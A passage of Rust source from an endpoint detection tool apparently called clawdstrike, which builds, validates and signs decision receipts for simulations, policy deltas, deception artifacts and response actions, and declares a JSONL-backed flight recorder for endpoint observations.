                EndpointReceiptEvidence::hashed("newDeceptionPlanRoot", new_plan_root),
                EndpointReceiptEvidence::hashed("oldDeceptionPlanHash", &old_plan_hash),
                EndpointReceiptEvidence::hashed("newDeceptionPlanHash", &new_plan_hash),
                EndpointReceiptEvidence::hashed("rotationReportHash", &report_hash),
                EndpointReceiptEvidence::hashed("dryRun", dry_run),
                EndpointReceiptEvidence::hashed("cleanupRemovedCount", cleanup_removed_count),
                EndpointReceiptEvidence::hashed(
                    "cleanupWouldRemoveCount",
                    cleanup_would_remove_count,
                ),
                EndpointReceiptEvidence::hashed("cleanupMissingCount", cleanup_missing_count),
                EndpointReceiptEvidence::hashed("cleanupRefusedCount", cleanup_refused_count),
                EndpointReceiptEvidence::hashed(
                    "materializationCreatedCount",
                    materialization_created_count,
                ),
                EndpointReceiptEvidence::hashed(
                    "materializationSkippedCount",
                    materialization_skipped_count,
                ),
                EndpointReceiptEvidence::hashed(
                    "deregisteredArtifactCount",
                    deregistered_artifact_count,
                ),
                EndpointReceiptEvidence::hashed(
                    "registeredArtifactCount",
                    registered_artifact_count,
                ),
                EndpointReceiptEvidence::hashed(
                    "remainingRegisteredArtifactCount",
                    remaining_registered_artifact_count,
                ),
            ],
        }
    }

    #[must_use]
    pub fn for_simulation(input: EndpointSimulationReceiptInput<'_>) -> Self {
        let graph_ref =
            EndpointGraphReference::for_subgraph(&input.simulation.root_node_id, input.graph);
        let affected_identity_context =
            simulation_context_evidence_value(&input.simulation.affected_identities);
        let affected_tool_context =
            simulation_context_evidence_value(&input.simulation.affected_tools);
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("simulationId", &input.simulation.simulation_id),
            EndpointReceiptEvidence::hashed("rootNodeId", &input.simulation.root_node_id),
            EndpointReceiptEvidence::hashed("graphSliceId", &input.simulation.graph_slice_id),
            EndpointReceiptEvidence::hashed("wouldBlock", input.simulation.would_block.to_string()),
            EndpointReceiptEvidence::hashed(
                "developerBreakageScore",
                input.simulation.developer_breakage_score.to_string(),
            ),
            EndpointReceiptEvidence::hashed("impactLevel", input.simulation.impact_level.as_str()),
            EndpointReceiptEvidence::hashed(
                "affectedNodeCount",
                input.simulation.affected_node_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed(
                "affectedEdgeCount",
                input.simulation.affected_edge_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed("affectedIdentityContext", affected_identity_context),
            EndpointReceiptEvidence::hashed("affectedToolContext", affected_tool_context),
        ];
        if let Some(content_hash) = graph_ref.content_hash.as_deref() {
            evidence.push(EndpointReceiptEvidence::hashed("contentHash", content_hash));
        }
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::Simulation,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.simulation.simulation_id.clone()),
                rule_id: Some(input.simulation.rule_id.clone()),
                title: Some("Endpoint policy impact simulation".to_string()),
                severity: None,
                confidence: Some(f32::from(input.simulation.developer_breakage_score) / 100.0),
                action: input.simulation.action.clone(),
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: graph_ref,
            evidence,
        }
    }

    #[must_use]
    pub fn for_policy_event_replay(input: EndpointPolicyEventReplayReceiptInput<'_>) -> Self {
        let replay_id = endpoint_policy_event_replay_id(EndpointPolicyEventReplayIdInput {
            policy_hash: input.policy.policy_hash.as_str(),
            policy_epoch: input.policy.policy_epoch,
            event_stream_hash: input.event_stream_hash,
            result_hash: input.result_hash,
            event_count: input.event_count,
            allowed_count: input.allowed_count,
            warn_count: input.warn_count,
            blocked_count: input.blocked_count,
            track_posture: input.track_posture,
        });
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::Simulation,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(replay_id.clone()),
                rule_id: Some("endpoint.policy_event_replay".to_string()),
                title: Some("Endpoint policy event replay".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::Observe,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference {
                graph_slice_id: Some(replay_id.clone()),
                process_stable_key: None,
                process_node_id: Some("policy_event_stream".to_string()),
                parent_process_guid: None,
                content_hash: None,
                node_ids: vec!["policy_event_stream".to_string()],
                edge_ids: Vec::new(),
            },
            evidence: vec![
                EndpointReceiptEvidence::hashed("replayId", replay_id),
                EndpointReceiptEvidence::hashed("eventStreamHash", input.event_stream_hash),
                EndpointReceiptEvidence::hashed("resultHash", input.result_hash),
                EndpointReceiptEvidence::hashed("eventCount", input.event_count.to_string()),
                EndpointReceiptEvidence::hashed("allowedCount", input.allowed_count.to_string()),
                EndpointReceiptEvidence::hashed("warnCount", input.warn_count.to_string()),
                EndpointReceiptEvidence::hashed("blockedCount", input.blocked_count.to_string()),
                EndpointReceiptEvidence::hashed("trackPosture", input.track_posture.to_string()),
            ],
        }
    }

    #[must_use]
    pub fn for_policy_event_impact(input: EndpointPolicyEventImpactReceiptInput<'_>) -> Self {
        let impact_id = endpoint_policy_event_impact_id(EndpointPolicyEventImpactIdInput {
            current_policy_hash: input.policy.policy_hash.as_str(),
            current_policy_epoch: input.policy.policy_epoch,
            proposed_policy_hash: input.proposed_policy_hash,
            proposed_policy_epoch: input.proposed_policy_epoch,
            event_stream_hash: input.event_stream_hash,
            current_result_hash: input.current_result_hash,
            proposed_result_hash: input.proposed_result_hash,
            impact_hash: input.impact_hash,
            event_count: input.event_count,
            changed_count: input.changed_count,
            allow_to_block_count: input.allow_to_block_count,
            track_posture: input.track_posture,
        });
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::Simulation,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(impact_id.clone()),
                rule_id: Some("endpoint.policy_event_impact".to_string()),
                title: Some("Endpoint policy event impact analysis".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::Observe,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference {
                graph_slice_id: Some(impact_id.clone()),
                process_stable_key: None,
                process_node_id: Some("policy_event_stream".to_string()),
                parent_process_guid: None,
                content_hash: None,
                node_ids: vec!["policy_event_stream".to_string()],
                edge_ids: Vec::new(),
            },
            evidence: vec![
                EndpointReceiptEvidence::hashed("impactId", impact_id),
                EndpointReceiptEvidence::hashed("eventStreamHash", input.event_stream_hash),
                EndpointReceiptEvidence::hashed("currentResultHash", input.current_result_hash),
                EndpointReceiptEvidence::hashed("proposedResultHash", input.proposed_result_hash),
                EndpointReceiptEvidence::hashed("impactHash", input.impact_hash),
                EndpointReceiptEvidence::hashed("proposedPolicyHash", input.proposed_policy_hash),
                EndpointReceiptEvidence::hashed(
                    "proposedPolicyEpoch",
                    input.proposed_policy_epoch.to_string(),
                ),
                EndpointReceiptEvidence::hashed("eventCount", input.event_count.to_string()),
                EndpointReceiptEvidence::hashed("changedCount", input.changed_count.to_string()),
                EndpointReceiptEvidence::hashed(
                    "allowToBlockCount",
                    input.allow_to_block_count.to_string(),
                ),
                EndpointReceiptEvidence::hashed("trackPosture", input.track_posture.to_string()),
            ],
        }
    }

    #[must_use]
    pub fn for_policy_delta(input: EndpointPolicyDeltaReceiptInput<'_>) -> Self {
        let policy_delta_id = endpoint_policy_delta_id(EndpointPolicyDeltaIdInput {
            endpoint_id: input.endpoint_id,
            rule_id: input.rule_id,
            action: &input.action,
            staged_detection_id: input.staged_detection_id,
            stage: input.stage,
            generated_at: input.generated_at,
            simulation_id: input.simulation_id,
            graph_slice_id: input.graph_slice_id,
            root_node_id: input.root_node_id,
            source_affected_identity_context: input.source_affected_identity_context,
            source_affected_tool_context: input.source_affected_tool_context,
        });
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("operation", input.operation),
            EndpointReceiptEvidence::hashed("policyDeltaId", &policy_delta_id),
            EndpointReceiptEvidence::hashed("stagedDetectionId", input.staged_detection_id),
            EndpointReceiptEvidence::hashed("stage", input.stage),
            EndpointReceiptEvidence::hashed("generatedAt", input.generated_at),
            EndpointReceiptEvidence::hashed("artifactHash", input.artifact_hash),
            EndpointReceiptEvidence::hashed("simulationId", input.simulation_id),
            EndpointReceiptEvidence::hashed("graphSliceId", input.graph_slice_id),
            EndpointReceiptEvidence::hashed("rootNodeId", input.root_node_id),
            EndpointReceiptEvidence::hashed(
                "sourceAffectedIdentityContext",
                input.source_affected_identity_context,
            ),
            EndpointReceiptEvidence::hashed(
                "sourceAffectedToolContext",
                input.source_affected_tool_context,
            ),
        ];
        if let Some(previous_policy_hash) = input.previous_policy_hash {
            evidence.push(EndpointReceiptEvidence::hashed(
                "previousPolicyHash",
                previous_policy_hash,
            ));
        }
        if let Some(new_policy_hash) = input.new_policy_hash {
            evidence.push(EndpointReceiptEvidence::hashed(
                "newPolicyHash",
                new_policy_hash,
            ));
        }
        if let Some(backup_path) = input.backup_path {
            evidence.push(EndpointReceiptEvidence::hashed("backupPath", backup_path));
        }
        if let Some(cross_window_impact_hash) = input.cross_window_impact_hash {
            evidence.push(EndpointReceiptEvidence::hashed(
                "crossWindowImpactHash",
                cross_window_impact_hash,
            ));
        }
        if let Some(cross_window_recommendation_hash) = input.cross_window_recommendation_hash {
            evidence.push(EndpointReceiptEvidence::hashed(
                "crossWindowRecommendationHash",
                cross_window_recommendation_hash,
            ));
        }

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::PolicyDelta,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(policy_delta_id),
                rule_id: Some(input.rule_id.to_string()),
                title: Some(format!("Endpoint staged policy delta {}", input.operation)),
                severity: None,
                confidence: None,
                action: input.action,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference {
                graph_slice_id: Some(input.graph_slice_id.to_string()),
                process_stable_key: None,
                process_node_id: Some(input.root_node_id.to_string()),
                parent_process_guid: None,
                content_hash: None,
                node_ids: vec![input.root_node_id.to_string()],
                edge_ids: Vec::new(),
            },
            evidence,
        }
    }

    pub fn validate(&self) -> Result<()> {
        require_field_eq(
            self.schema_version.as_str(),
            ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION,
            "endpoint decision receipt schema version",
        )?;
        require_nonempty(self.actor.endpoint_id.as_str(), "endpoint id")?;
        require_nonzero(self.local_sequence, "local sequence")?;
        require_nonempty(
            self.signer.signer_identity.as_str(),
            "endpoint receipt signer identity",
        )?;
        require_nonempty(self.policy.policy_version.as_str(), "policy version")?;
        require_nonempty(self.policy.policy_hash.as_str(), "policy hash")?;
        Hash::from_hex(self.policy.policy_hash.as_str())
            .with_context(|| "policy hash must be a 32-byte hex hash")?;
        require_nonzero(self.policy.policy_epoch, "policy epoch")?;
        require_nonempty(self.clock.source.as_str(), "clock source")?;
        if self.sensor_state.providers.is_empty() {
            return Err(anyhow!(
                "endpoint receipt requires at least one sensor state"
            ));
        }
        let mut provider_ids = BTreeSet::new();
        for provider in &self.sensor_state.providers {
            require_nonempty(provider.provider_id.as_str(), "sensor provider id")?;
            if !provider_ids.insert(provider.provider_id.as_str()) {
                return Err(anyhow!(
                    "duplicate sensor provider id {}",
                    provider.provider_id
                ));
            }
            require_provider_last_seen_consistency(provider, &self.clock.captured_at)?;
            require_provider_degradation_consistency(provider)?;
            if provider.degraded && provider.degradation_reasons.is_empty() {
                return Err(anyhow!(
                    "degraded sensor provider {} requires a degradation reason",
                    provider.provider_id
                ));
            }
            if provider.degraded {
                for reason in &provider.degradation_reasons {
                    require_nonempty(reason.as_str(), "sensor provider degradation reason")?;
                }
            }
        }
        require_receipt_evidence(&self.evidence)?;
        if let Some(confidence) = self.decision.confidence {
            if !confidence.is_finite() || !(0.0..=1.0).contains(&confidence) {
                return Err(anyhow!("decision confidence must be between 0.0 and 1.0"));
            }
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::SensorState {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "sensor state id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "sensor state rule id")?;
            if self.decision.action != EndpointDecisionAction::Observe {
                return Err(anyhow!("sensor state receipt action must be observe"));
            }
            require_sensor_state_evidence(
                &self.evidence,
                &self.decision,
                &self.actor,
                &self.policy,
                &self.sensor_state,
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::PrivacyReport {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "privacy report id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "privacy report rule id")?;
            if self.decision.action != EndpointDecisionAction::Observe {
                return Err(anyhow!("privacy report receipt action must be observe"));
            }
            require_privacy_report_evidence(&self.evidence, self.decision.finding_id.as_deref())?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::ProviderDegradation {
            require_optional_nonempty(
                self.decision.finding_id.as_deref(),
                "provider degradation id",
            )?;
            require_optional_nonempty(
                self.decision.rule_id.as_deref(),
                "provider degradation rule id",
            )?;
            if self
                .sensor_state
                .providers
                .iter()
                .all(|provider| !provider.degraded)
            {
                return Err(anyhow!(
                    "provider degradation receipt requires a degraded provider"
                ));
            }
            require_provider_degradation_evidence(
                &self.evidence,
                self.decision.finding_id.as_deref(),
                self.decision.rule_id.as_deref(),
                &self.actor,
                &self.policy,
                &self.sensor_state,
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::Observation {
            require_optional_nonempty(self.decision.observation_id.as_deref(), "observation id")?;
            require_optional_nonempty(
                self.decision.finding_id.as_deref(),
                "observation receipt id",
            )?;
            require_optional_nonempty(
                self.decision.rule_id.as_deref(),
                "observation receipt rule id",
            )?;
            require_confidence(self.decision.confidence, "observation receipt confidence")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(self.graph.process_node_id.as_deref(), "process node id")?;
            if self.decision.action != EndpointDecisionAction::Observe {
                return Err(anyhow!("observation receipt action must be observe"));
            }
            if !self.decision.passed {
                return Err(anyhow!("observation receipt must pass"));
            }
            require_observation_evidence(
                &self.evidence,
                &self.decision,
                &self.actor,
                &self.policy,
                &self.sensor_state,
                &self.graph,
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::PolicyDecision {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "policy decision id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "policy decision rule id")?;
            if !matches!(
                self.decision.action,
                EndpointDecisionAction::Allow | EndpointDecisionAction::Block
            ) {
                return Err(anyhow!(
                    "policy decision receipt action must be allow or block"
                ));
            }
            match self.decision.action {
                EndpointDecisionAction::Allow if !self.decision.passed => {
                    return Err(anyhow!("policy decision allow action must pass"));
                }
                EndpointDecisionAction::Block if self.decision.passed => {
                    return Err(anyhow!("policy decision block action must fail"));
                }
                _ => {}
            }
            require_policy_decision_evidence(
                &self.evidence,
                &self.decision,
                &self.actor,
                &self.policy,
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::PolicyDelta {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "policy delta id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "policy delta rule id")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(
                self.graph.process_node_id.as_deref(),
                "policy delta root node id",
            )?;
            require_policy_delta_graph_reference(&self.graph)?;
            require_policy_delta_evidence(
                &self.evidence,
                &self.decision,
                &self.actor,
                &self.policy,
                self.graph.graph_slice_id.as_deref(),
                self.graph.process_node_id.as_deref(),
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::GraphSlice {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "graph slice rule id")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(
                self.graph.process_node_id.as_deref(),
                "graph slice root node id",
            )?;
            require_subgraph_reference(&self.graph, "graph slice")?;
            require_graph_slice_evidence(
                &self.evidence,
                self.decision.finding_id.as_deref(),
                self.graph.graph_slice_id.as_deref(),
                self.graph.process_node_id.as_deref(),
                self.graph.node_ids.len(),
                self.graph.edge_ids.len(),
            )?;
            require_graph_slice_content_hash_evidence(
                &self.evidence,
                self.graph.content_hash.as_deref(),
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::Detection {
            require_optional_nonempty(
                self.decision.observation_id.as_deref(),
                "detection observation id",
            )?;
            require_optional_nonempty(self.decision.finding_id.as_deref(), "detection finding id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "detection rule id")?;
            require_confidence(self.decision.confidence, "detection confidence")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(self.graph.process_node_id.as_deref(), "process node id")?;
            if self.decision.action != EndpointDecisionAction::Alert {
                return Err(anyhow!("detection receipt action must be alert"));
            }
            if self.decision.passed {
                return Err(anyhow!("detection receipt must fail the decision gate"));
            }
            require_detection_evidence(&self.evidence, &self.decision, &self.graph)?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::EvidenceBundleManifest {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "evidence bundle id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "evidence bundle rule id")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(self.graph.process_node_id.as_deref(), "process node id")?;
            require_subgraph_reference(&self.graph, "evidence bundle")?;
            require_evidence_bundle_manifest_evidence(
                &self.evidence,
                self.decision.finding_id.as_deref(),
                self.graph.graph_slice_id.as_deref(),
                self.graph.content_hash.as_deref(),
                self.graph.node_ids.len(),
                self.graph.edge_ids.len(),
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::Simulation {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "simulation id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "simulation rule id")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(
                self.graph.process_node_id.as_deref(),
                "simulation root node id",
            )?;
            require_simulation_evidence(&self.evidence, &self.decision, &self.graph, &self.policy)?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::DeceptionMaterialization {
            require_optional_nonempty(
                self.decision.finding_id.as_deref(),
                "deception materialization id",
            )?;
            require_optional_nonempty(
                self.decision.rule_id.as_deref(),
                "deception materialization rule id",
            )?;
            if self.decision.action != EndpointDecisionAction::Observe {
                return Err(anyhow!(
                    "deception materialization receipt action must be observe"
                ));
            }
            require_deception_materialization_evidence(
                &self.evidence,
                &self.actor,
                &self.policy,
                self.decision.finding_id.as_deref(),
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::DeceptionCleanup {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "deception cleanup id")?;
            require_optional_nonempty(
                self.decision.rule_id.as_deref(),
                "deception cleanup rule id",
            )?;
            if self.decision.action != EndpointDecisionAction::Observe {
                return Err(anyhow!("deception cleanup receipt action must be observe"));
            }
            require_deception_cleanup_evidence(
                &self.evidence,
                &self.decision,
                &self.actor,
                &self.policy,
                self.decision.finding_id.as_deref(),
            )?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::DeceptionRotation {
            require_optional_nonempty(
                self.decision.finding_id.as_deref(),
                "deception rotation id",
            )?;
            require_optional_nonempty(
                self.decision.rule_id.as_deref(),
                "deception rotation rule id",
            )?;
            if self.decision.action != EndpointDecisionAction::Observe {
                return Err(anyhow!("deception rotation receipt action must be observe"));
            }
            require_deception_rotation_evidence(
                &self.evidence,
                &self.decision,
                &self.actor,
                &self.policy,
                self.decision.finding_id.as_deref(),
            )?;
        }
        if matches!(
            self.receipt_family,
            EndpointDecisionReceiptFamily::ResponseRequest
                | EndpointDecisionReceiptFamily::ResponseExecution
                | EndpointDecisionReceiptFamily::ResponseRollback
                | EndpointDecisionReceiptFamily::ResponseAcknowledgement
        ) {
            require_optional_nonempty(self.decision.finding_id.as_deref(), "response action id")?;
            require_optional_nonempty(self.decision.rule_id.as_deref(), "response rule id")?;
            require_optional_nonempty(self.graph.graph_slice_id.as_deref(), "graph slice id")?;
            require_optional_nonempty(
                self.graph.process_node_id.as_deref(),
                "response root node id",
            )?;
            require_response_action_for_family(&self.receipt_family, &self.decision)?;
            require_confidence(self.decision.confidence, "response confidence")?;
            require_response_actor_context(&self.actor)?;
            require_response_actor_evidence(&self.actor, &self.evidence)?;
            require_optional_nonempty(self.decision.rollback_ref.as_deref(), "rollback ref")?;
            match self.decision.ttl_seconds {
                Some(ttl) if ttl > 0 => {}
                _ => return Err(anyhow!("response ttl seconds is required")),
            }
            require_subgraph_reference(&self.graph, "response")?;
            if self.receipt_family == EndpointDecisionReceiptFamily::ResponseRequest {
                require_response_request_receipt_evidence(
                    &self.decision,
                    &self.evidence,
                    self.graph.process_node_id.as_deref().unwrap_or_default(),
                    self.graph.graph_slice_id.as_deref().unwrap_or_default(),
                    self.graph.content_hash.as_deref(),
                    self.decision.ttl_seconds.unwrap_or_default(),
                    self.decision.rollback_ref.as_deref().unwrap_or_default(),
                )?;
            } else {
                require_response_receipt_evidence(
                    &self.evidence,
                    &self.decision.action,
                    self.graph.process_node_id.as_deref().unwrap_or_default(),
                    self.graph.graph_slice_id.as_deref().unwrap_or_default(),
                    self.decision.ttl_seconds.unwrap_or_default(),
                    self.decision.rollback_ref.as_deref().unwrap_or_default(),
                )?;
            }
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::ResponseRequest {
            require_response_request_dry_run_evidence(&self.decision, &self.evidence)?;
            require_response_reason_evidence(&self.evidence)?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::ResponseExecution {
            require_response_execution_id_evidence(
                &self.evidence,
                &self.decision,
                self.graph.process_node_id.as_deref().unwrap_or_default(),
                self.graph.graph_slice_id.as_deref().unwrap_or_default(),
                self.graph.content_hash.as_deref(),
            )?;
            require_response_execution_status_evidence(&self.decision, &self.evidence)?;
            require_response_reason_evidence(&self.evidence)?;
            require_response_execution_evidence_bundle_evidence(
                &self.evidence,
                &self.decision,
                self.graph.process_node_id.as_deref().unwrap_or_default(),
                self.graph.graph_slice_id.as_deref().unwrap_or_default(),
                self.graph.content_hash.as_deref(),
            )?;
            require_response_execution_dry_run_evidence(&self.evidence)?;
            require_response_execution_actor_evidence(&self.evidence)?;
            require_response_effect_count_evidence(
                &self.evidence,
                "executionEffect:",
                "execution effect count evidence",
            )?;
            require_response_effect_evidence_hashes(
                &self.evidence,
                "executionEffect:",
                "execution effect evidence",
            )?;
            require_response_execution_effect_type_evidence(&self.decision, &self.evidence)?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::ResponseRollback {
            require_response_family_id_evidence(
                &self.evidence,
                "rollbackId",
                self.decision.finding_id.as_deref(),
                "rollback id evidence",
            )?;
            require_response_rollback_status_evidence(&self.decision, &self.evidence)?;
            require_response_reason_evidence(&self.evidence)?;
            let response_action_id = response_action_id_from_signed_response_fields(
                self.graph.process_node_id.as_deref().unwrap_or_default(),
                self.graph.graph_slice_id.as_deref().unwrap_or_default(),
                &self.decision.action,
                self.decision.ttl_seconds.unwrap_or_default(),
            );
            require_response_rollback_execution_id_evidence(
                &self.evidence,
                self.decision.finding_id.as_deref(),
                response_action_id.as_str(),
                self.decision.rollback_ref.as_deref().unwrap_or_default(),
            )?;
            require_response_effect_count_evidence(
                &self.evidence,
                "rollbackEffect:",
                "rollback effect count evidence",
            )?;
            require_response_effect_evidence_hashes(
                &self.evidence,
                "rollbackEffect:",
                "rollback effect evidence",
            )?;
            require_response_rollback_effect_type_evidence(&self.decision, &self.evidence)?;
        }
        if self.receipt_family == EndpointDecisionReceiptFamily::ResponseAcknowledgement {
            require_response_family_id_evidence(
                &self.evidence,
                "acknowledgementId",
                self.decision.finding_id.as_deref(),
                "acknowledgement id evidence",
            )?;
            require_response_acknowledgement_status_evidence(&self.decision, &self.evidence)?;
            require_response_acknowledged_by_evidence(&self.actor, &self.evidence)?;
            let response_action_id = response_action_id_from_signed_response_fields(
                self.graph.process_node_id.as_deref().unwrap_or_default(),
                self.graph.graph_slice_id.as_deref().unwrap_or_default(),
                &self.decision.action,
                self.decision.ttl_seconds.unwrap_or_default(),
            );
            require_response_acknowledgement_note_evidence(&self.evidence)?;
            require_response_control_acknowledgement_evidence(&self.evidence)?;
            require_response_effect_count_evidence(
                &self.evidence,
                "acknowledgementEffect:",
                "acknowledgement effect count evidence",
            )?;
            require_response_effect_evidence_hashes(
                &self.evidence,
                "acknowledgementEffect:",
                "acknowledgement effect evidence",
            )?;
            require_response_acknowledgement_effect_evidence(&self.decision, &self.evidence)?;
            require_response_acknowledgement_effect_type_evidence(&self.decision, &self.evidence)?;
            require_response_acknowledgement_execution_id_evidence(
                &self.evidence,
                self.decision.finding_id.as_deref(),
                response_action_id.as_str(),
                self.decision.rollback_ref.as_deref().unwrap_or_default(),
                self.actor.agent_id.as_deref().unwrap_or_default(),
            )?;
        }
        Ok(())
    }

    pub fn to_receipt(&self) -> Result<Receipt> {
        self.validate()?;
        let endpoint_metadata =
            serde_json::to_value(self).context("serialize endpoint decision receipt metadata")?;
        let canonical = canonicalize_json(&endpoint_metadata)
            .context("canonicalize endpoint decision receipt metadata")?;
        let content_hash = sha256(canonical.as_bytes());
        let policy_hash = Hash::from_hex(self.policy.policy_hash.as_str())
            .with_context(|| "policy hash must be a 32-byte hex hash")?;

        Ok(Receipt::new(content_hash, self.to_verdict())
            .with_id(self.receipt_id())
            .with_provenance(Provenance {
                clawdstrike_version: Some(env!("CARGO_PKG_VERSION").to_string()),
                provider: Some("clawdstrike.endpoint_decision_engine".to_string()),
                policy_hash: Some(policy_hash),
                ruleset: Some(self.policy.policy_version.clone()),
                violations: Vec::new(),
            })
            .with_metadata(serde_json::json!({
                "endpointDecision": endpoint_metadata,
            })))
    }

    pub fn sign_with(&self, signer: &dyn Signer) -> Result<SignedReceipt> {
        let actual_public_key = signer.public_key().to_hex();
        if let Some(expected_public_key) = self.signer.signer_public_key.as_deref() {
            if !hex_strings_match(expected_public_key, actual_public_key.as_str()) {
                return Err(anyhow!(
                    "endpoint receipt signer public key does not match signer identity metadata"
                ));
            }
        }

        let mut receipt = self.clone();
        if receipt.signer.signer_public_key.is_none() {
            receipt.signer.signer_public_key = Some(actual_public_key);
        }

        SignedReceipt::sign_with(receipt.to_receipt()?, signer)
            .context("sign endpoint decision receipt")
    }

    #[must_use]
    pub fn receipt_id(&self) -> String {
        let family = format!("{:?}", self.receipt_family);
        let sequence = self.local_sequence.to_string();
        let observation_id = self.decision.observation_id.as_deref().unwrap_or_default();
        let finding_id = self.decision.finding_id.as_deref().unwrap_or_default();
        stable_id(
            "endpoint_receipt",
            [
                self.schema_version.as_str(),
                self.actor.endpoint_id.as_str(),
                family.as_str(),
                sequence.as_str(),
                observation_id,
                finding_id,
            ],
        )
    }

    fn to_verdict(&self) -> Verdict {
        Verdict {
            passed: self.decision.passed,
            gate_id: self.decision.rule_id.clone().or_else(|| {
                Some(camel_debug_to_snake(
                    format!("{:?}", self.receipt_family).as_str(),
                ))
            }),
            scores: self.decision.confidence.map(|confidence| {
                serde_json::json!({
                    "confidence": confidence,
                })
            }),
            threshold: None,
        }
    }
}

/// Durable local flight recorder for endpoint observations.
///
/// The recorder appends canonical [`EndpointObservation`] records to JSONL and
/// rebuilds the causal graph from that log when opened. This deliberately keeps
/// storage simple and inspectable for the first local EDR slice: the JSONL log is
/// the source of truth, and the graph is a deterministic projection over it.
#[derive(Debug)]
pub struct EndpointFlightRecorder {
    path: Option<PathBuf>,
    recorder: CausalGraphRecorder,
    observation_count: usize,
}

#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct EndpointFlightRecorderSnapshot {
    pub path: Option<PathBuf>,
    pub observation_count: usize,
    pub graph: CausalGraph,
}

#[derive(Clone, Debug, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct EndpointFlightRecorderHistoryWindow {
    pub selection_mode: String,
    pub index_path: Option<PathBuf>,
